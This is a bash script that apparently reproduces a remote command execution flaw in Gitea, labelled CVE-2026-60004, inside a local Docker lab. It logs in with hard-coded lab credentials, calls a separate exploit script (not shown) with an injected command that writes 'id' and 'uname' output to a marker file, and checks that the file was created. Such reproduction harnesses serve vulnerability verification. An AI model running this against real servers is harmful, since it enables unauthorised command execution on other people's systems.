#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPT_DIR
readonly TARGET_URL="${1:-http://localhost:3000}"
readonly CONTAINER="gitea-cve-2026-60004"
readonly DEV_USER="dev"
readonly DEV_PASSWORD="Password123!"
readonly DEV_REPO="project"
readonly MARKER_FILE="/tmp/pwned.txt"
readonly WAIT_TIMEOUT_SEC=30

ensure_environment() {
    if ! docker ps --format '{{.Names}}' | grep -qx "${CONTAINER}"; then
        echo "[*] Starting target environment via Docker Compose..."
        docker compose up -d
    fi

    echo "[*] Waiting for target repository (${DEV_USER}/${DEV_REPO}) to be ready..."
    local elapsed=0
    until curl -fsS -u "${DEV_USER}:${DEV_PASSWORD}" \
        "${TARGET_URL}/api/v1/repos/${DEV_USER}/${DEV_REPO}" >/dev/null 2>&1; do
        if (( elapsed >= WAIT_TIMEOUT_SEC )); then
            echo "[-] Timed out waiting for Gitea initialization after ${WAIT_TIMEOUT_SEC}s." >&2
            exit 1
        fi
        sleep 1
        elapsed=$((elapsed + 1))
    done
}

main() {
    cd "${SCRIPT_DIR}"

    echo "[*] Ensuring target container is running..."
    ensure_environment

    echo "[*] Target version info:"
    docker exec "${CONTAINER}" gitea --version
    docker exec "${CONTAINER}" git --version

    docker exec "${CONTAINER}" rm -f "${MARKER_FILE}"

    echo "[*] Running verification PoC with pre-configured environment credentials..."
    python3 poc/exploit.py \
        --url "${TARGET_URL}" \
        --username "${DEV_USER}" \
        --password "${DEV_PASSWORD}" \
        --repo "${DEV_REPO}" \
        --cmd "id > ${MARKER_FILE}; uname -a >> ${MARKER_FILE}"

    if ! docker exec "${CONTAINER}" test -s "${MARKER_FILE}"; then
        echo "[-] Verification failed: ${MARKER_FILE} was not created or is empty." >&2
        exit 1
    fi

    echo "[*] Verification output from container (${MARKER_FILE}):"
    docker exec "${CONTAINER}" cat "${MARKER_FILE}"
}

main "$@"
